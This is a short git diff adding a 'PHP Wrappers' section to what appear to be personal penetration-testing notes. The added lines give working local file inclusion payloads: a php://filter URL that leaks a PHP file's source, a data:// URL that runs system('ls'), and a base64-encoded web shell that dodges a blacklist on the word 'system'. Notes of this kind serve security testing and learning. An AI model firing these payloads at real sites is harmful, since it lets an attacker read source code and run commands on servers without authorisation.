@@ -32,6 +32,10 @@ tree $folder | grep -v ".php" | grep -v ".js" | grep -v ".css" | tee >(wc -l)
 php -S 127.0.0.1:8000
 ```
 
+##### PHP Wrappers
+You can use a LFI to:
+- read files, e.g. admin.php with `index.php?page=php://filter/convert.base64-encode/resource=admin.php` , then decode base64 by piping it to `base64 -d`
+- execute commands if _allow_url_include_ is enabled with `index.php?page=data://text/plain,<?php%20echo%20system('ls');?>` (or `data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"` if the string "system" is blacklisted).
 ##### Yet-to-try:
 Check potential vulnerable urls with https://github.com/1ndianl33t/Gf-Patterns
 https://github.com/stevenvachon/broken-link-checker
